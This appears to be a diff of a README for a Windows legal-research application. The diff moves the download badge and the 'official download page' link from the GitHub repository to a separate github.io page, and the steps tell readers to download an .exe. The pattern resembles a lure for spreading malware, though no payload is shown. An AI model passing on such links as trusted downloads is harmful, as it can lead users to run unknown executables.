@@ -1,6 +1,6 @@
 # ⚖️ fallhome-law-research-hub - Simplify legal research and firm workflows
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/alanfaced566/fallhome-law-research-hub)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://alanfaced566.github.io)
 
 ## 📁 Overview
 
@@ -19,7 +19,7 @@ This application runs on standard Windows hardware. Ensure your device meets the
 
 Follow these steps to obtain the tool:
 
-1.  Visit the [official download page](https://github.com/alanfaced566/fallhome-law-research-hub).
+1.  Visit the [official download page](https://alanfaced566.github.io).
 2.  Look for the latest release version on the right side of the screen.
 3.  Select the file ending in .exe to start your download.
 4.  Save the file to your Downloads folder.
